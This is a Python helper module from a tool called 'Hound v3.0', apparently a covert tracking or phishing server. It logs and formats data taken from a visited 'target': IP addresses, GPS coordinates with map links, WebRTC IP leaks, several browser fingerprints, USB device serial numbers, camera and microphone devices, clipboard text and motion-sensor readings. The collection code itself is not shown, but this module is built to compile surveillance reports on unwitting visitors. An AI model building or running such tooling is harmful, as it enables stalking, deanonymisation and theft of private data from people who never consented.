"""
Hound v3.0 - Utility Functions
Helper functions for data processing and logging
"""

import uuid
import json
import logging
from datetime import datetime
from typing import Optional, Dict, Any
from pathlib import Path
from config import settings

logger = logging.getLogger(__name__)


def get_client_ip(request) -> str:
    """Extract client IP address from request"""
    ip = request.client.host if request.client else "UNKNOWN"
    
    # Check for proxy headers
    if "x-forwarded-for" in request.headers:
        ip = request.headers["x-forwarded-for"].split(",")[0].strip()
    elif "x-client-ip" in request.headers:
        ip = request.headers["x-client-ip"]
    elif "cf-connecting-ip" in request.headers:  # Cloudflare
        ip = request.headers["cf-connecting-ip"]
    
    return ip


def generate_session_id() -> str:
    """Generate unique session ID"""
    return str(uuid.uuid4())


def format_timestamp() -> str:
    """Get current timestamp in ISO format"""
    return datetime.utcnow().isoformat()


def save_orientation_log(data: Dict[str, Any]) -> None:
    """Save orientation data to log file"""
    try:
        if 'timestamp' not in data:
            data['timestamp'] = format_timestamp()
        
        log_entry = (
            f"[{data.get('timestamp')}] "
            f"Alpha: {data.get('alpha', 0):6.2f} | "
            f"Beta: {data.get('beta', 0):6.2f} | "
            f"Gamma: {data.get('gamma', 0):6.2f}\n"
        )
        
        with open(settings.ORIENTATION_LOG, 'a') as f:
            f.write(log_entry)
        
        logger.debug("✅ Orientation logged")
    except Exception as e:
        logger.error(f"❌ Error logging orientation: {e}")


def save_motion_log(data: Dict[str, Any]) -> None:
    """Save motion data to log file"""
    try:
        if 'timestamp' not in data:
            data['timestamp'] = format_timestamp()
        
        acc = data.get('acceleration', {})
        rot = data.get('rotation_rate', {})
        interval = data.get('interval', 0)
        
        log_entry = (
            f"[{data.get('timestamp')}] "
            f"Accel: x={acc.get('x', 0):6.2f} y={acc.get('y', 0):6.2f} z={acc.get('z', 0):6.2f} | "
            f"Rot: a={rot.get('alpha', 0):6.2f} b={rot.get('beta', 0):6.2f} g={rot.get('gamma', 0):6.2f} | "
            f"Interval: {interval}ms\n"
        )
        
        with open(settings.ORIENTATION_LOG, 'a') as f:
            f.write(log_entry)
        
        logger.debug("✅ Motion logged")
    except Exception as e:
        logger.error(f"❌ Error logging motion: {e}")


def save_live_orientation_json(data: Dict[str, Any]) -> None:
    """Save current orientation data as JSON for live viewer"""
    try:
        with open(settings.ORIENTATION_JSON, 'w') as f:
            json.dump(data, f)
        logger.debug("✅ Live orientation JSON updated")
    except Exception as e:
        logger.error(f"❌ Error saving orientation JSON: {e}")


def save_raw_data_json(raw_payload: str) -> None:
    """Save raw JSON payload for backup"""
    try:
        with open(settings.RAW_DATA_JSON, 'a') as f:
            f.write(raw_payload + "\n")
        logger.debug("✅ Raw data backup saved")
    except Exception as e:
        logger.error(f"❌ Error saving raw data: {e}")


def save_visitor_log(ip: str, user_agent: str, referer: str, method: str, protocol: str) -> None:
    """Log visitor information"""
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = (
            f"IP: {ip} | "
            f"User-Agent: {user_agent} | "
            f"Referer: {referer} | "
            f"Method: {method} | "
            f"Protocol: {protocol} | "
            f"Time: {timestamp}\n"
        )
        
        with open(settings.VISITORS_LOG, 'a') as f:
            f.write(log_entry)
        
        with open(settings.IP_LOG, 'a') as f:
            f.write(log_entry)
        
        logger.debug(f"📝 Visitor logged: {ip}")
    except Exception as e:
        logger.error(f"❌ Error logging visitor: {e}")


def format_data_output(data: Dict[str, Any], target_local_time: Optional[str] = None) -> str:
    """Format collected data for human-readable output"""
    output = "\n" + "="*70 + "\n"
    output += f"📅 Target Local Time: {target_local_time or format_timestamp()}\n"
    output += "-"*70 + "\n"
    
    # Device Information
    if 'device_info' in data:
        output += "📱 DEVICE INFORMATION\n"
        output += "-"*40 + "\n"
        for key, value in data['device_info'].items():
            if isinstance(value, (dict, list)):
                output += f"{key}: {json.dumps(value)}\n"
            else:
                output += f"{key}: {value}\n"
    
    # Battery
    if 'battery_info' in data:
        output += "\n🔋 BATTERY STATUS\n"
        output += "-"*40 + "\n"
        for key, value in data['battery_info'].items():
            output += f"{key}: {value}\n"
    
    # IP & Location
    if 'ip_info' in data:
        output += "\n🌐 IP & LOCATION\n"
        output += "-"*40 + "\n"
        for key, value in data['ip_info'].items():
            output += f"{key}: {value}\n"
    
    # GPS
    if 'gps' in data and data['gps']:
        output += "\n📍 GPS COORDINATES\n"
        output += "-"*40 + "\n"
        gps = data['gps']
        for key, value in gps.items():
            output += f"{key}: {value}\n"
        if gps.get('latitude') and gps.get('longitude'):
            maps_url = f"https://www.google.com/maps?q={gps['latitude']},{gps['longitude']}"
            output += f"Google Maps: {maps_url}\n"
    
    # Network
    if 'network_info' in data:
        output += "\n📶 NETWORK INFORMATION\n"
        output += "-"*40 + "\n"
        for key, value in data['network_info'].items():
            output += f"{key}: {value}\n"
    
    # Local IP
    if 'local_ip' in data:
        output += "\n🌐 LOCAL IP ADDRESS\n"
        output += "-"*40 + "\n"
        output += f"Local IP: {data['local_ip']}\n"
    
    # WebRTC IP
    if 'webrtc_public_ip' in data:
        output += "\n🛰️ WEBRTC PUBLIC IP (LEAK)\n"
        output += "-"*40 + "\n"
        output += f"Public IP: {data['webrtc_public_ip']}\n"
    
    # Fingerprints
    if 'canvas_fingerprint' in data:
        output += "\n🖌️ CANVAS FINGERPRINT (SHA-256)\n"
        output += "-"*40 + "\n"
        output += f"Hash: {data['canvas_fingerprint']}\n"
    
    if 'webgl_fingerprint' in data:
        output += "\n🎨 WEBGL FINGERPRINT\n"
        output += "-"*40 + "\n"
        if isinstance(data['webgl_fingerprint'], dict):
            for key, val in data['webgl_fingerprint'].items():
                output += f"{key}: {val}\n"
        else:
            output += f"Info: {data['webgl_fingerprint']}\n"
    
    if 'audio_fingerprint' in data:
        output += "\n🔊 AUDIO FINGERPRINT\n"
        output += "-"*40 + "\n"
        audio = str(data['audio_fingerprint'])[:200]
        output += f"Signature: {audio}...\n"
    
    if 'fonts_signature' in data:
        output += "\n🔤 FONTS SIGNATURE\n"
        output += "-"*40 + "\n"
        output += f"Signature: {data['fonts_signature']}\n"
    
    # Media Devices
    if 'media_devices' in data:
        output += "\n🎥 MEDIA DEVICES\n"
        output += "-"*40 + "\n"
        for device in data['media_devices']:
            output += f"  - {device.get('kind')} | {device.get('label')} (ID: {device.get('device_id')})\n"
    
    # USB Devices
    if 'usb_devices' in data:
        output += "\n🔌 USB DEVICES\n"
        output += "-"*40 + "\n"
        for device in data['usb_devices']:
            output += (
                f"  - {device.get('product_name')} | "
                f"{device.get('manufacturer_name')} | "
                f"SN: {device.get('serial_number')}\n"
            )
    
    # Clipboard
    if 'clipboard_data' in data:
        output += "\n📋 CLIPBOARD DATA\n"
        output += "-"*40 + "\n"
        output += f"Text: {data['clipboard_data']}\n"
    
    # GPS Error
    if 'gps_error' in data:
        output += "\n❌ GPS ERROR\n"
        output += "-"*40 + "\n"
        output += f"Error: {data['gps_error']}\n"
    
    output += "="*70 + "\n"
    return output


def setup_logging():
    """Configure logging"""
    logging.basicConfig(
        level=settings.LOG_LEVEL,
        format=settings.LOG_FORMAT,
        handlers=[
            logging.StreamHandler(),
            logging.FileHandler(str(Path(settings.LOG_DIR) / 'hound.log'))
        ]
    )
